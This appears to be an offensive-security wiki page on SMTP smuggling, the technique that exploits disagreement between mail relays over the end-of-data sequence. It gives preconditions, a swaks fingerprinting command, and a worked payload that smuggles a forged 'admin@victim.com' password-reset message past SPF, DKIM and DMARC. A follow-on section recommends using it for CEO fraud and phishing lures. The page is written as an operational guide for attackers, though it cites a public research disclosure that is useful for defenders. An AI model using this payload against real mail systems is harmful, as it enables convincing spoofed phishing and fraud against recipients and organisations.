---
title: "SMTP smuggling: injecting spoofed transactions across relay disagreement"
description: "When an outbound relay and an inbound server disagree on the end-of-data sequence, bytes the outbound relay passes through literally are treated as end-of-data by the inbound server, so the data after them is parsed as a brand-new SMTP transaction on the same trusted, SPF/DKIM-aligned connection, yielding a fully spoofed message that passes DMARC."
keywords:
  - smtp smuggling
  - end of data
  - dmarc bypass
  - email spoofing
  - message boundary
---

# SMTP smuggling

The DATA phase of SMTP ends at a single canonical sequence: `<CR><LF>.<CR><LF>` (a line containing only a dot). SMTP smuggling, published by Timo Longin at SEC Consult, exploits the fact that implementations disagree about what else counts as that boundary. Some servers also end the message on `<LF>.<LF>`, or `<CR>.<CR>`, or `<CR><LF>.<CR>`, accepting a lone-LF or lone-CR dot-line that the standard would not. If you relay a message through an outbound provider that is SPF- and DKIM-aligned for its own domain, and embed an end-of-data variant that the outbound relay forwards *literally* (it does not treat it as the end) but the inbound server *does* treat as the end, then the inbound server closes your intended message early and parses whatever you put after it as a fresh `MAIL FROM`/`RCPT TO`/`DATA` on the same connection. That connection is still the outbound provider's authenticated, reputation-bearing session, so the smuggled message inherits its SPF and DKIM alignment and passes DMARC with a sender you chose.

## Preconditions

- An account on an outbound provider whose relay is permissive about the end-of-data sequence (the outbound half must pass your crafted dot-line through unmodified inside DATA).
- A target whose inbound server honors a non-standard end-of-data variant (the inbound half must terminate early on it).
- The spoofed domain is whatever the receiver trusts; the authentication you borrow belongs to the aligned outbound sender, so the forged `From:` passes DMARC even though you do not control its keys.

Fingerprint which variant an inbound server accepts by sending test messages and observing whether a message split on `\n.\n` / `\r.\r` is delivered as one body or two:

```bash
swaks --server inbound.victim.com --to probe@victim.com --from you@aligned.com \
      --data $'From: you@aligned.com\r\nSubject: boundary probe\r\n\r\nbody-one\n.\nbody-two\r\n.\r\n'
# delivered as TWO messages (or a second transaction logged) => inbound ends on \n.\n => smugglable
```

## Worked payload

You submit one message through the aligned outbound relay. Its DATA contains an early non-standard terminator, then the smuggled second transaction:

```text
MAIL FROM:<you@aligned.com>
RCPT TO:<you@aligned.com>
DATA
From: you@aligned.com
Subject: carrier

carrier body
<LF>.<LF>                         <- lone-LF dot: inbound server treats this as END OF DATA
MAIL FROM:<admin@victim.com>      <- parsed by inbound as a NEW transaction on the trusted conn
RCPT TO:<target@victim.com>
DATA
From: admin@victim.com
Subject: Mandatory password reset
To: target@victim.com

Click the portal link and re-authenticate.
.
```
The outbound relay sees `<LF>.<LF>` as ordinary body text and forwards everything as one message; the inbound server stops at `<LF>.<LF>`, then reads the `MAIL FROM:<admin@victim.com>` block as a genuine new message arriving over the aligned session. Result: `target@victim.com` receives mail from `admin@victim.com` that passes SPF, DKIM, and DMARC.

Pick the variant per receiver from the fingerprint step: use `<LF>.<LF>` against inbound servers that accept bare-LF, `<CR>.<CR>` or `<CR><LF>.<CR>` against those that accept bare-CR. The right variant is the one the inbound honors and the outbound ignores.

## Follow-on

- Deliver internal-looking spoofed mail for CEO fraud, password-reset lures, or approval fraud that survives DMARC, which an [open relay](open-relay.md) spoof usually cannot.
- Chain with [user enumeration](user-enumeration.md) to address real internal recipients and with harvested org data to make the smuggled `From:` and content convincing.

## Tools

- [The-Login: SMTP Smuggling tools (PoC)](https://github.com/The-Login/SMTP-Smuggling-Tools)
- [swaks](https://github.com/jetmore/swaks)

## References

- [SEC Consult: SMTP smuggling, spoofing emails worldwide](https://sec-consult.com/blog/detail/smtp-smuggling-spoofing-e-mails-worldwide/)
- [The-Login: SMTP Smuggling tools and technical details](https://github.com/The-Login/SMTP-Smuggling-Tools)
- [RFC 5321 section 4.1.1.4 (DATA end sequence)](https://datatracker.ietf.org/doc/html/rfc5321#section-4.1.1.4)
